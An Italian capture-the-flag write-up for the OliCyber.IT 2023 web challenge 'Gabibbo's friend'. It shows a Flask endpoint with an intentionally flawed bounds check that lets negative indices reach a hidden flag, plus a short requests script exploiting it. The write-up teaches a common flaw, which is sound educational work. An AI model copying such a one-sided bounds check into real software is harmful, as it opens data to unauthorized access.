# OliCyber.IT 2023 - Selezione territoriale

## [web-2] Gabibbo's friend (306 risoluzioni)

Nella challenge si possono richiedere delle immagini, ma solo se l'id è minore di 5. In caso contrario viene censusato il risultato della richiesta. DEVICE_MEMORY è un array di 8 elementi, di cui il sesto è la flag.

```python
@app.route('/get-picture')
def getPicture():
    id = int(request.args['id'])

    if (id > 4):
        return '???'

    return DEVICE_MEMORY[id]
```

### Soluzione

Si possono richiedere numeri negativi, in python -1 è l'ultimo elemento di un array, -2 il penultimo e così via. Quindi si può richiedere l'immagine con id -3, che è la flag.

### Exploit

```python
import requests
r = requests.get(f"{URL}/get-picture?id=-3")
print(r.text)
```
